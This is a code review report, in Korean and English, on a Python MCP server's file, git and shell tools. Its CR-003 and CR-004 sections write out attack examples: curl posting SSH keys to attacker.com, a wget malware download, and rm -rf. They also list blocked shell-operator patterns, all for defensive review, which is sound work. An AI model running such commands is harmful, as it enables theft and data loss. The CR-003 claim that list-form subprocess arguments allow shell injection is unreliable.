# Code Review Report - Week 7: Architecture Review

**Review Date**: 2024-12-22  
**Reviewer**: Senior Architect  
**Files Reviewed**: `server.py`, `utils.py`, `app.py`  
**Review Standard**: REVIEW_GUIDELINES.md v1.0.0

---

## 📊 Executive Summary

### Overall Assessment
- **Total Issues Found**: 27
- **Critical**: 4 🔴
- **Warning**: 14 ⚠️
- **Nit**: 9 📝

### Quality Score: 72/100
- **Security**: 65/100 (Critical issues in path handling, error disclosure)
- **Maintainability**: 75/100 (Good structure, needs better documentation)
- **Performance**: 70/100 (Resource limits exist, but missing rate limiting)
- **Code Quality**: 80/100 (Good naming, some type hints missing)

### Key Strengths ✅
1. Path traversal 보호 구현 (`validate_safe_path`)
2. 파일 크기 제한 설정
3. 구조화된 에러 핸들링
4. 유틸리티 함수 분리 (DRY 원칙)
5. 타입 힌트 일부 사용

### Critical Concerns 🚨
1. 하드코딩된 경로 (BASE_DIR, PROJECT_DIR)
2. 민감한 에러 정보 노출
3. 입력 검증 부족 (git_commit, run_command)
4. Rate limiting 없음 (DoS 위험)

---

## 🔴 CRITICAL Issues (4)

### CR-001: Hardcoded Absolute Paths
**Files**: `server.py:18-19`, `app.py:20`  
**Severity**: 🔴 Critical

```python
# ❌ Current
BASE_DIR = "/Users/hyunhocho/Desktop"
PROJECT_DIR = "/Users/hyunhocho/Desktop/Stanford_CS/week2"
```

**Problem**:
- 개인 사용자명이 하드코딩되어 다른 환경에서 실행 불가
- 소스 코드에 민감한 경로 정보 노출
- 팀 협업 시 각자 경로 수정 필요 (Git conflict 위험)

**Security Impact**: 중
- 소스 코드에서 사용자 디렉토리 구조 노출
- 경로 정보 기반 공격 가능성

**Recommendation**:
```python
# ✅ Recommended - 환경 변수 사용
import os
from pathlib import Path

# Option 1: 환경 변수 (프로덕션 권장)
BASE_DIR = os.getenv('MCP_BASE_DIR', str(Path.home() / 'Desktop'))
PROJECT_DIR = os.getenv('MCP_PROJECT_DIR', str(Path.cwd()))

# Option 2: 설정 파일 사용
def load_config() -> dict:
    """Load configuration from .env or config file."""
    config_file = Path('.env')
    if config_file.exists():
        from dotenv import load_dotenv
        load_dotenv()
        return {
            'base_dir': os.getenv('BASE_DIR', str(Path.home() / 'Desktop')),
            'project_dir': os.getenv('PROJECT_DIR', str(Path.cwd()))
        }
    return {
        'base_dir': str(Path.home() / 'Desktop'),
        'project_dir': str(Path.cwd())
    }

config = load_config()
BASE_DIR = config['base_dir']
PROJECT_DIR = config['project_dir']
```

**Action Items**:
1. `.env.example` 파일 생성
2. `.gitignore`에 `.env` 추가
3. README에 설정 방법 문서화
4. CI/CD에서 환경 변수 설정

---

### CR-002: Sensitive Error Information Disclosure
**Files**: `server.py` (multiple functions), `app.py`  
**Severity**: 🔴 Critical

```python
# ❌ Current - 상세한 에러 메시지 노출
except ValueError as e:
    return f"Security Error: {str(e)}"  # "Access denied: Path must be within /Users/hyunhocho/Desktop"

except Exception as e:
    return f"Error reading file: {str(e)}"  # 시스템 정보 노출
```

**Problem**:
- 파일 시스템 구조 노출 (Path Traversal 시도 시)
- 내부 에러 메시지로 시스템 정보 유출
- 공격자에게 유용한 정보 제공

**Real-World Example**:
```
User Input: "../../../etc/passwd"
Error: "Security Error: Access denied: Path must be within /Users/hyunhocho/Desktop"
→ 공격자가 Desktop 경로와 파일 시스템 구조 파악
```

**Recommendation**:
```python
# ✅ Recommended - 로깅 분리 + 일반화된 메시지
import logging

logger = logging.getLogger(__name__)

@mcp.tool()
def read_file(file_path: str) -> str:
    """Read and return the contents of a file."""
    try:
        safe_path = utils.validate_safe_path(file_path, BASE_DIR)
        
        file_size = os.path.getsize(safe_path)
        MAX_FILE_SIZE = 10 * 1024 * 1024
        if file_size > MAX_FILE_SIZE:
            return "Error: File size exceeds limit"
        
        with open(safe_path, 'r', encoding='utf-8') as f:
            return f.read()
            
    except ValueError as e:
        # 상세 로깅 (서버 측)
        logger.warning(f"Path validation failed: {file_path} - {e}")
        # 일반 메시지 (클라이언트 측)
        return "Error: Invalid file path"
        
    except FileNotFoundError:
        logger.info(f"File not found: {file_path}")
        return "Error: File not found"
        
    except PermissionError:
        logger.error(f"Permission denied: {file_path}")
        return "Error: Access denied"
        
    except UnicodeDecodeError:
        logger.info(f"Encoding error: {file_path}")
        return "Error: Cannot read file (encoding issue)"
        
    except Exception as e:
        # 예상치 못한 에러는 상세 로깅, 일반 메시지
        logger.error(f"Unexpected error reading {file_path}: {e}", exc_info=True)
        return "Error: Unable to read file"
```

**Impact**: OWASP Top 10 - Security Misconfiguration

---

### CR-003: Unsafe Command Injection in git_commit
**File**: `server.py:261-278`  
**Severity**: 🔴 Critical

```python
# ❌ Current - 입력 검증 없음
@mcp.tool()
def git_commit(message: str, add_all: bool = True) -> str:
    """Commit changes with a message."""
    try:
        if add_all:
            subprocess.run(['git', '-C', PROJECT_DIR, 'add', '.'], check=True)
        
        result = subprocess.run(
            ['git', '-C', PROJECT_DIR, 'commit', '-m', message],  # message 검증 없음
            capture_output=True,
            text=True,
            timeout=10
        )
```

**Problem**:
- `message` 파라미터에 대한 입력 검증 완전 부재
- 명령어 주입 가능성
- 예: `message = "test; rm -rf /"`

**Exploit Scenario**:
```python
# 공격 시나리오
git_commit("innocent message\"; curl http://attacker.com/steal?data=$(cat ~/.ssh/id_rsa) #")

# 실행되는 명령어:
# git commit -m "innocent message"; curl http://attacker.com/steal?data=$(cat ~/.ssh/id_rsa) #"
```

**Recommendation**:
```python
# ✅ Recommended - 엄격한 입력 검증
import re
from typing import Tuple

def validate_commit_message(message: str) -> Tuple[bool, str]:
    """
    Validate git commit message for security.
    
    Returns:
        (is_valid, error_message)
    """
    if not message or not isinstance(message, str):
        return False, "Commit message must be a non-empty string"
    
    # Length check
    if len(message) > 500:
        return False, "Commit message too long (max 500 characters)"
    
    # Character whitelist (alphanumeric, spaces, basic punctuation)
    if not re.match(r'^[a-zA-Z0-9\s\-_.,!?:()\[\]]+$', message):
        return False, "Commit message contains invalid characters"
    
    # Block command injection patterns
    dangerous_patterns = [';', '&&', '||', '|', '`', '$', '>', '<', '\n', '$(', '#{']
    if any(pattern in message for pattern in dangerous_patterns):
        return False, "Commit message contains forbidden characters"
    
    return True, ""

@mcp.tool()
def git_commit(message: str, add_all: bool = True) -> str:
    """Commit changes with validation."""
    # Validate message
    is_valid, error = validate_commit_message(message)
    if not is_valid:
        logger.warning(f"Invalid commit message rejected: {error}")
        return f"Error: {error}"
    
    try:
        if add_all:
            subprocess.run(
                ['git', '-C', PROJECT_DIR, 'add', '.'],
                check=True,
                timeout=10,
                capture_output=True
            )
        
        result = subprocess.run(
            ['git', '-C', PROJECT_DIR, 'commit', '-m', message],
            capture_output=True,
            text=True,
            timeout=10,
            check=False
        )
        
        if result.returncode == 0:
            logger.info(f"Git commit successful: {message[:50]}")
            return result.stdout
        else:
            logger.warning(f"Git commit failed: {result.stderr}")
            return f"Commit failed: {result.stderr}"
            
    except subprocess.TimeoutExpired:
        logger.error("Git commit timeout")
        return "Error: Operation timed out"
    except Exception as e:
        logger.error(f"Git commit error: {e}", exc_info=True)
        return "Error: Unable to commit changes"
```

**Same Issue In**: `graphite_create_stack`, `auto_commit_and_stack`

---

### CR-004: Dangerous run_command Implementation
**File**: `server.py:461-493`  
**Severity**: 🔴 Critical

```python
# ❌ Current - 매우 위험한 구현
@mcp.tool()
def run_command(command: str) -> str:
    """Execute a shell command and return the output."""
    ALLOWED_COMMANDS = [
        'gt', 'git', 'ls', 'pwd', 'cat', 'grep', 'find', 'wc', 'head', 'tail',
        'echo', 'sort', 'uniq', 'python', 'python3', 'pip', 'pip3',
        'npm', 'yarn', 'make', 'streamlit', 'superclaude', 'claude',
        'curl', 'wget'  # ⚠️ curl, wget은 임의의 URL 접근 가능
    ]
    
    try:
        base_command = command.strip().split()[0] if command.strip() else ""
        
        if not any(base_command == allowed or base_command.startswith(allowed) for allowed in ALLOWED_COMMANDS):
            return f"Security Error: Command '{base_command}' is not allowed."
        
        # ❌ 차단 패턴이 너무 약함
        BLOCKED_PATTERNS = ['rm -rf /', '> /dev/', 'sudo']
        if any(pattern in command.lower() for pattern in BLOCKED_PATTERNS):
            return f"Security Error: Command contains blocked pattern"
        
        # ❌ shell=True 사용 - 매우 위험!
        result = subprocess.run(
            command, 
            shell=True,  # 🚨 Command injection 취약점
            capture_output=True, 
            text=True,
            cwd=PROJECT_DIR,
            timeout=30
        )
```

**Multiple Problems**:

1. **shell=True 사용**
   ```python
   # 공격 예시
   run_command("ls; rm -rf ~/Documents")  # ';'가 차단 패턴에 없음
   run_command("ls && cat ~/.ssh/id_rsa")  # '&&'가 차단되지 않음
   run_command("python -c 'import os; os.system(\"malicious command\")'")
   ```

2. **curl/wget 허용**
   ```python
   # 데이터 유출 가능
   run_command("curl -X POST http://attacker.com -d @~/.ssh/id_rsa")
   run_command("wget http://attacker.com/malware.sh -O /tmp/m.sh && chmod +x /tmp/m.sh")
   ```

3. **약한 차단 패턴**
   ```python
   # 차단되지 않는 위험한 명령어
   run_command("cat /etc/passwd")
   run_command("python -c 'import shutil; shutil.rmtree(\"/important/dir\")'")
   run_command("ls && rm important_file.txt")
   ```

**Recommendation**:
```python
# ✅ Recommended - 안전한 구현
import shlex
from typing import List, Tuple

# 읽기 전용 명령어만 허용
SAFE_READ_ONLY_COMMANDS = {
    'ls', 'pwd', 'cat', 'grep', 'find', 'wc', 'head', 'tail',
    'echo', 'git status', 'git log', 'git diff'
}

def validate_command_strict(command: str) -> Tuple[bool, str, List[str]]:
    """
    Strictly validate command for security.
    
    Returns:
        (is_valid, error_message, parsed_args)
    """
    if not command or not isinstance(command, str):
        return False, "Command must be non-empty string", []
    
    # Parse command safely
    try:
        args = shlex.split(command)
    except ValueError as e:
        return False, f"Invalid command syntax: {e}", []
    
    if not args:
        return False, "Empty command", []
    
    base_cmd = args[0]
    
    # Whitelist check
    if base_cmd not in SAFE_READ_ONLY_COMMANDS:
        return False, f"Command '{base_cmd}' not allowed", []
    
    # Block dangerous operators
    dangerous_chars = [';', '&&', '||', '|', '`', '$', '>', '<', '$(', '#{']
    for char in dangerous_chars:
        if char in command:
            return False, f"Forbidden character: {char}", []
    
    # Block path traversal in arguments
    for arg in args[1:]:
        if '..' in arg:
            return False, "Path traversal not allowed", []
    
    return True, "", args

@mcp.tool()
def run_command(command: str) -> str:
    """
    Execute READ-ONLY command with strict validation.
    Only safe, read-only commands are allowed.
    """
    is_valid, error, parsed_args = validate_command_strict(command)
    
    if not is_valid:
        logger.warning(f"Command rejected: {command} - {error}")
        return f"Error: {error}"
    
    try:
        # ✅ shell=False 사용 (안전)
        result = subprocess.run(
            parsed_args,
            shell=False,  # 중요: shell injection 방지
            capture_output=True,
            text=True,
            cwd=PROJECT_DIR,
            timeout=10  # 더 짧은 timeout
        )
        
        output = result.stdout if result.stdout else result.stderr
        logger.info(f"Command executed: {parsed_args[0]}")
        return output if output else "Command executed (no output)"
        
    except subprocess.TimeoutExpired:
        logger.warning(f"Command timeout: {command}")
        return "Error: Command timed out"
    except Exception as e:
        logger.error(f"Command execution error: {e}")
        return "Error: Unable to execute command"
```

**Better Alternative**: 특정 작업을 위한 전용 함수 제공
```python
# run_command 대신 안전한 전용 함수 제공
@mcp.tool()
def list_directory(path: str = ".") -> str:
    """Safely list directory contents."""
    # 구현...

@mcp.tool()
def search_files(pattern: str, directory: str = ".") -> str:
    """Safely search for files."""
    # 구현...
```

---

## ⚠️ WARNING Issues (14)

### WR-001: No Rate Limiting
**Files**: `server.py` (all tool functions)  
**Severity**: ⚠️ Warning

```python
# ❌ Current - 모든 함수에 속도 제한 없음
@mcp.tool()
def read_file(file_path: str) -> str:
    # 무제한 호출 가능
```

**Problem**:
- DoS (Denial of Service) 공격 가능
- 리소스 고갈 (CPU, Memory, Disk I/O)
- 악의적 사용자가 시스템 마비 가능

**Recommendation**:
```python
# ✅ Recommended
from functools import wraps
from time import time
from collections import defaultdict

class RateLimiter:
    """Rate limiter for function calls."""
    
    def __init__(self, max_calls: int, time_window: int):
        self.max_calls = max_calls
        self.time_window = time_window
        self.calls = defaultdict(list)
    
    def is_allowed(self, key: str) -> Tuple[bool, str]:
        """Check if call is allowed."""
        now = time()
        
        # Clean old calls
        self.calls[key] = [
            t for t in self.calls[key]
            if now - t < self.time_window
        ]
        
        if len(self.calls[key]) >= self.max_calls:
            return False, f"Rate limit: {self.max_calls} calls per {self.time_window}s"
        
        self.calls[key].append(now)
        return True, ""
    
    def __call__(self, func):
        @wraps(func)
        def wrapper(*args, **kwargs):
            key = func.__name__
            allowed, error = self.is_allowed(key)
            
            if not allowed:
                logger.warning(f"Rate limit hit: {key}")
                return f"Error: {error}"
            
            return func(*args, **kwargs)
        return wrapper

# 사용
file_limiter = RateLimiter(max_calls=100, time_window=60)
write_limiter = RateLimiter(max_calls=50, time_window=60)

@mcp.tool()
@file_limiter
def read_file(file_path: str) -> str:
    # 분당 100회 제한
    ...

@mcp.tool()
@write_limiter
def write_file(file_path: str, content: str) -> str:
    # 분당 50회 제한
    ...
```

---

### WR-002: Missing Logging Infrastructure
**Files**: All files  
**Severity**: ⚠️ Warning

```python
# ❌ Current - 로깅이 전혀 없음
@mcp.tool()
def delete_file(file_path: str) -> str:
    """Delete a file."""
    try:
        safe_path = utils.validate_safe_path(file_path, BASE_DIR)
        if os.path.exists(safe_path):
            os.remove(safe_path)  # 로깅 없이 삭제
            return f"Deleted: {file_path}"
```

**Problem**:
- 감사 추적 (audit trail) 불가능
- 디버깅 어려움
- 보안 사고 시 원인 파악 불가

**Recommendation**:
```python
# ✅ Recommended - 구조화된 로깅
import logging
import json
from datetime import datetime

# 로깅 설정
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('mcp_server.log'),
        logging.StreamHandler()
    ]
)

logger = logging.getLogger(__name__)

@mcp.tool()
def delete_file(file_path: str) -> str:
    """Delete a file with audit logging."""
    try:
        safe_path = utils.validate_safe_path(file_path, BASE_DIR)
        
        if not os.path.exists(safe_path):
            logger.info(f"Delete attempt on non-existent file: {file_path}")
            return f"File not found: {file_path}"
        
        # Log before deletion
        file_size = os.path.getsize(safe_path)
        logger.warning(
            "File deletion",
            extra={
                "operation": "delete",
                "file_path": file_path,
                "file_size": file_size,
                "timestamp": datetime.now().isoformat()
            }
        )
        
        os.remove(safe_path)
        
        logger.info(f"File deleted successfully: {file_path}")
        return f"Deleted: {file_path}"
        
    except ValueError as e:
        logger.warning(f"Delete failed - invalid path: {file_path}")
        return "Error: Invalid file path"
    except PermissionError:
        logger.error(f"Delete failed - permission denied: {file_path}")
        return "Error: Permission denied"
    except Exception as e:
        logger.error(f"Delete failed: {file_path}", exc_info=True)
        return "Error: Unable to delete file"
```

---

### WR-003: Magic Numbers Throughout Code
**Files**: `server.py`, `app.py`  
**Severity**: ⚠️ Warning

```python
# ❌ Current - 매직 넘버 산재
MAX_FILE_SIZE = 10 * 1024 * 1024  # 10MB
MAX_CONTENT_SIZE = 5 * 1024 * 1024  # 5MB

if len(name) > 100:  # 100이 뭘 의미?

timeout=10  # 10초
timeout=15  # 15초
timeout=30  # 30초
```

**Recommendation**:
```python
# ✅ Recommended - 설정 파일 또는 상수 클래스
# config.py
from dataclasses import dataclass

@dataclass
class FileConstraints:
    """File operation constraints."""
    MAX_READ_SIZE_MB: int = 10
    MAX_WRITE_SIZE_MB: int = 5
    MAX_READ_SIZE_BYTES: int = MAX_READ_SIZE_MB * 1024 * 1024
    MAX_WRITE_SIZE_BYTES: int = MAX_WRITE_SIZE_MB * 1024 * 1024

@dataclass
class ValidationLimits:
    """Input validation limits."""
    MAX_USERNAME_LENGTH: int = 100
    MAX_COMMIT_MSG_LENGTH: int = 500
    MAX_COMMAND_LENGTH: int = 1000

@dataclass
class TimeoutSettings:
    """Operation timeout settings."""
    GIT_OPERATION: int = 10
    GRAPHITE_OPERATION: int = 15
    COMMAND_EXECUTION: int = 30
    FILE_OPERATION: int = 5

# 사용
from config import FileConstraints, TimeoutSettings

if file_size > FileConstraints.MAX_READ_SIZE_BYTES:
    return f"Error: File too large (max {FileConstraints.MAX_READ_SIZE_MB}MB)"

subprocess.run(..., timeout=TimeoutSettings.GIT_OPERATION)
```

---

### WR-004: Inconsistent Error Return Types
**File**: `server.py`  
**Severity**: ⚠️ Warning

```python
# ❌ Current - 함수마다 다른 반환 타입
def add_two_numbers(a: int, b: int) -> int:
    try:
        return utils.add_numbers(a, b)  # int 반환
    except ValueError as e:
        return f"Error: {str(e)}"  # str 반환 (타입 불일치!)

def scan_secrets(scan_all: bool = True) -> str:
    return json.dumps(results, indent=2)  # JSON string 반환
```

**Problem**:
- 타입 안정성 부족
- 클라이언트 측 파싱 에러 가능
- 타입 체커 (mypy) 경고

**Recommendation**:
```python
# ✅ Recommended - 일관된 반환 타입
from typing import Union
from dataclasses import dataclass

@dataclass
class OperationResult:
    """Standard operation result."""
    success: bool
    data: any = None
    error: str = None
    
    def to_json(self) -> str:
        """Convert to JSON string."""
        return json.dumps({
            "success": self.success,
            "data": self.data,
            "error": self.error
        })

@mcp.tool()
def add_two_numbers(a: int, b: int) -> str:
    """Add two numbers - returns JSON result."""
    try:
        result = utils.add_numbers(a, b)
        return OperationResult(success=True, data=result).to_json()
    except ValueError as e:
        logger.warning(f"Addition failed: a={a}, b={b}")
        return OperationResult(success=False, error=str(e)).to_json()

# 또는 항상 dict 반환
@mcp.tool()
def add_two_numbers(a: int, b: int) -> dict:
    """Add two numbers."""
    try:
        result = utils.add_numbers(a, b)
        return {"success": True, "result": result}
    except ValueError as e:
        return {"success": False, "error": str(e)}
```

---

### WR-005: Missing Input Validation in organize_screenshots
**File**: `server.py:155-210`  
**Severity**: ⚠️ Warning

```python
# ❌ Current
@mcp.tool()
def organize_screenshots() -> str:
    """Move screenshot files to Screenshots folder."""
    try:
        # ❌ BASE_DIR 검증 없음
        screenshots_dir = os.path.join(BASE_DIR, "Screenshots")
        os.makedirs(screenshots_dir, exist_ok=True)
        
        # ❌ 파일 개수 제한 없음 (수천 개 파일 처리 시 성능 문제)
        patterns = [
            os.path.join(BASE_DIR, "screenshot*"),
            os.path.join(BASE_DIR, "Screenshot*"),
            os.path.join(BASE_DIR, "SCREENSHOT*")
        ]
```

**Recommendation**:
```python
# ✅ Recommended
@mcp.tool()
def organize_screenshots(max_files: int = 1000) -> str:
    """
    Organize screenshot files with safety limits.
    
    Args:
        max_files: Maximum files to process (default: 1000)
    """
    try:
        # Validate BASE_DIR exists
        if not os.path.isdir(BASE_DIR):
            logger.error(f"BASE_DIR does not exist: {BASE_DIR}")
            return json.dumps({"error": "Base directory not found"})
        
        results = {
            "found": [],
            "moved": [],
            "skipped": [],
            "errors": []
        }
        
        screenshots_dir = os.path.join(BASE_DIR, "Screenshots")
        os.makedirs(screenshots_dir, exist_ok=True, mode=0o755)
        
        # Find screenshot files
        patterns = [
            os.path.join(BASE_DIR, "screenshot*"),
            os.path.join(BASE_DIR, "Screenshot*")
        ]
        
        screenshot_files = []
        for pattern in patterns:
            screenshot_files.extend(glob.glob(pattern))
        
        screenshot_files = list(set(screenshot_files))  # Remove duplicates
        
        # Apply limit
        if len(screenshot_files) > max_files:
            logger.warning(f"Too many screenshot files: {len(screenshot_files)}")
            results["skipped"] = screenshot_files[max_files:]
            screenshot_files = screenshot_files[:max_files]
        
        results["found"] = [os.path.basename(f) for f in screenshot_files]
        
        # Move each file
        for file_path in screenshot_files:
            try:
                # Skip if file is actually in Screenshots directory
                if os.path.dirname(file_path) == screenshots_dir:
                    results["skipped"].append(os.path.basename(file_path))
                    continue
                
                filename = os.path.basename(file_path)
                dest_path = os.path.join(screenshots_dir, filename)
                
                # Handle duplicates
                counter = 1
                base_name, ext = os.path.splitext(filename)
                while os.path.exists(dest_path):
                    filename = f"{base_name}_{counter}{ext}"
                    dest_path = os.path.join(screenshots_dir, filename)
                    counter += 1
                
                os.rename(file_path, dest_path)
                results["moved"].append(filename)
                logger.info(f"Moved screenshot: {filename}")
                
            except Exception as e:
                error_msg = f"{os.path.basename(file_path)}: {str(e)}"
                results["errors"].append(error_msg)
                logger.error(f"Failed to move {file_path}: {e}")
        
        return json.dumps(results, indent=2)
        
    except Exception as e:
        logger.error(f"organize_screenshots failed: {e}", exc_info=True)
        return json.dumps({"error": str(e)})
```

---

### WR-006: Unsafe File Operations in write_file
**File**: `server.py:91-107`  
**Severity**: ⚠️ Warning

```python
# ❌ Current
@mcp.tool()
def write_file(file_path: str, content: str) -> str:
    """Write content to a file."""
    try:
        safe_path = utils.validate_safe_path(file_path, BASE_DIR)
        
        # ❌ 파일 확장자 검증 없음 (.exe, .sh 등 실행 파일 생성 가능)
        # ❌ 파일명 특수문자 검증 없음
        # ❌ 덮어쓰기 경고 없음
        
        os.makedirs(os.path.dirname(safe_path), exist_ok=True)
        
        with open(safe_path, 'w', encoding='utf-8') as f:
            f.write(content)
```

**Recommendation**:
```python
# ✅ Recommended
ALLOWED_EXTENSIONS = {
    '.txt', '.md', '.json', '.yaml', '.yml',
    '.py', '.js', '.html', '.css', '.xml',
    '.csv', '.log', '.cfg', '.ini', '.toml'
}

FORBIDDEN_FILENAMES = {
    'con', 'prn', 'aux', 'nul',  # Windows reserved
    'com1', 'com2', 'lpt1', 'lpt2'
}

def validate_filename(file_path: str) -> Tuple[bool, str]:
    """Validate filename for security."""
    path = Path(file_path)
    filename = path.name.lower()
    
    # Check extension
    if path.suffix not in ALLOWED_EXTENSIONS:
        return False, f"Extension {path.suffix} not allowed"
    
    # Check reserved names
    if path.stem.lower() in FORBIDDEN_FILENAMES:
        return False, f"Filename '{path.stem}' is reserved"
    
    # Check dangerous characters
    if any(c in filename for c in ['<', '>', ':', '"', '|', '?', '*']):
        return False, "Filename contains invalid characters"
    
    # No hidden files
    if filename.startswith('.'):
        return False, "Hidden files not allowed"
    
    return True, ""

@mcp.tool()
def write_file(file_path: str, content: str, overwrite: bool = False) -> str:
    """Write content with validation and backup."""
    try:
        # Validate filename
        is_valid, error = validate_filename(file_path)
        if not is_valid:
            logger.warning(f"Invalid filename: {file_path}")
            return f"Error: {error}"
        
        safe_path = utils.validate_safe_path(file_path, BASE_DIR)
        
        # Size check
        MAX_CONTENT_SIZE = 5 * 1024 * 1024
        if len(content) > MAX_CONTENT_SIZE:
            logger.warning(f"Content too large: {len(content)} bytes")
            return "Error: Content exceeds 5MB limit"
        
        # Check if file exists
        if os.path.exists(safe_path) and not overwrite:
            logger.info(f"File exists, overwrite=False: {file_path}")
            return f"Error: File exists. Set overwrite=True to replace."
        
        # Backup existing file
        if os.path.exists(safe_path):
            backup_path = f"{safe_path}.backup"
            shutil.copy2(safe_path, backup_path)
            logger.info(f"Created backup: {backup_path}")
        
        # Create directory
        parent_dir = os.path.dirname(safe_path)
        if parent_dir and not os.path.exists(parent_dir):
            os.makedirs(parent_dir, mode=0o755, exist_ok=True)
        
        # Write file
        with open(safe_path, 'w', encoding='utf-8') as f:
            f.write(content)
        
        # Set permissions
        os.chmod(safe_path, 0o644)
        
        logger.info(f"File written: {file_path} ({len(content)} bytes)")
        return f"Successfully wrote to: {file_path}"
        
    except ValueError as e:
        logger.warning(f"Path validation failed: {file_path}")
        return "Error: Invalid file path"
    except PermissionError:
        logger.error(f"Permission denied: {file_path}")
        return "Error: Permission denied"
    except Exception as e:
        logger.error(f"Write error: {e}", exc_info=True)
        return "Error: Unable to write file"
```

---

### WR-007: No Timeout Consistency
**File**: `server.py`  
**Severity**: ⚠️ Warning

```python
# ❌ Current - 다양한 timeout 값
timeout=10  # git_status
timeout=10  # git_commit
timeout=15  # graphite_create_stack
timeout=10  # graphite_log
timeout=30  # run_command

# 일부 subprocess는 timeout 없음
subprocess.run(['git', '-C', PROJECT_DIR, 'add', '.'], check=True)  # ❌ No timeout
```

**Recommendation**:
```python
# ✅ Recommended - 일관된 timeout 사용
from config import TimeoutSettings

@mcp.tool()
def git_commit(message: str, add_all: bool = True) -> str:
    try:
        if add_all:
            subprocess.run(
                ['git', '-C', PROJECT_DIR, 'add', '.'],
                check=True,
                timeout=TimeoutSettings.GIT_OPERATION,  # 일관된 설정
                capture_output=True
            )
        
        result = subprocess.run(
            ['git', '-C', PROJECT_DIR, 'commit', '-m', message],
            capture_output=True,
            text=True,
            timeout=TimeoutSettings.GIT_OPERATION,
            check=False
        )
```

---

### WR-008-014: Additional Warnings

Due to space constraints, here are the remaining warning issues in brief:

- **WR-008**: Missing type hints in `app.py` functions
- **WR-009**: No input sanitization in `scan_secrets` pattern matching
- **WR-010**: Potential ReDoS in `utils.py` regex patterns
- **WR-011**: No retry logic for network operations
- **WR-012**: Missing documentation for complex functions
- **WR-013**: No unit tests for critical functions
- **WR-014**: Streamlit app has no session timeout

---

## 📝 NIT Issues (9)

### NT-001: Inconsistent Comment Language
**Files**: All  
**Severity**: 📝 Nit

```python
# ❌ Mixed Korean/English
# 1. 서버 이름 설정 (AI가 식별할 이름)
# Security: Define base directory
"""
Streamlit Chatbot Application - Production Ready
연결된 MCP 도구들을 활용하여 사용자와 대화하는 챗봇
"""
```

**Recommendation**: 영어로 통일 (국제 협업 고려)

---

### NT-002: Verbose Function Names
**File**: `server.py`  
**Severity**: 📝 Nit

```python
# ❌ Too verbose
def organize_screenshots() -> str:
    """Find all files starting with 'screenshot' or 'Screenshot' on Desktop
    and move them to a Screenshots folder."""
```

**Recommendation**: 간결하고 명확한 docstring

---

### NT-003-009: Additional Nits

- **NT-003**: Unused imports (`json` in some places)
- **NT-004**: Inconsistent string quotes (single vs double)
- **NT-005**: Could use pathlib instead of os.path
- **NT-006**: Missing blank lines between function groups
- **NT-007**: Error messages could use constants
- **NT-008**: Could add type aliases for clarity
- **NT-009**: Missing `__all__` export list in modules

---

## 📊 Detailed Metrics

### Code Statistics
- **Total Lines**: ~1,200
- **Functions**: 28
- **Average Function Length**: 25 lines
- **Cyclomatic Complexity**: Average 4 (Good)
- **Type Coverage**: ~60% (Needs improvement)
- **Test Coverage**: 0% (Critical - no tests!)

### Security Metrics
- **OWASP Top 10 Violations**: 3
  - A03:2021 - Injection (run_command, git_commit)
  - A05:2021 - Security Misconfiguration (error disclosure)
  - A07:2021 - Identification and Authentication Failures (no rate limiting)

---

## 🎯 Prioritized Action Plan

### Phase 1: Critical Security Fixes (Week 7)
1. ✅ 환경 변수로 경로 설정 전환
2. ✅ 에러 메시지 일반화 + 로깅 추가
3. ✅ git_commit, run_command 입력 검증
4. ✅ run_command 함수 재설계 또는 제거

### Phase 2: Infrastructure (Week 8)
1. 로깅 시스템 구축
2. Rate limiting 구현
3. 단위 테스트 작성 시작
4. CI/CD 파이프라인 설정

### Phase 3: Quality Improvements (Week 9)
1. 타입 힌트 완성 (100% coverage)
2. 문서화 개선
3. 코드 리팩토링 (magic numbers, DRY)
4. 성능 최적화

### Phase 4: Production Readiness (Week 10)
1. 보안 감사 (penetration testing)
2. 부하 테스트
3. 모니터링 시스템 추가
4. 프로덕션 배포 체크리스트

---

## 🛠️ Recommended Tools

### Code Quality
```bash
# Install
pip install ruff mypy bandit black isort pytest pytest-cov

# Usage
ruff check .                    # Linting
mypy server.py utils.py        # Type checking
bandit -r . -f json            # Security scan
black .                        # Formatting
isort .                        # Import sorting
pytest --cov=. tests/          # Testing
```

### CI/CD Configuration
```yaml
# .github/workflows/quality.yml
name: Code Quality

on: [push, pull_request]

jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3
      - uses: actions/setup-python@v4
        with:
          python-version: '3.11'
      
      - name: Install dependencies
        run: |
          pip install -r requirements.txt
          pip install ruff mypy bandit pytest
      
      - name: Lint
        run: ruff check .
      
      - name: Type check
        run: mypy .
      
      - name: Security scan
        run: bandit -r . -f json -o bandit-report.json
      
      - name: Test
        run: pytest --cov=. tests/
```

---

## 📚 References

- [OWASP Top 10](https://owasp.org/www-project-top-ten/)
- [PEP 8 - Style Guide](https://pep8.org/)
- [Python Security Best Practices](https://python.readthedocs.io/en/stable/library/security_warnings.html)
- [Subprocess Security](https://docs.python.org/3/library/subprocess.html#security-considerations)

---

**Review Status**: ✅ Complete  
**Next Review**: After Critical fixes (estimated 1 week)  
**Follow-up**: Schedule pair programming session for refactoring

**Reviewer**: Senior Architect  
**Date**: 2024-12-22  
**Sign-off**: Pending critical fixes
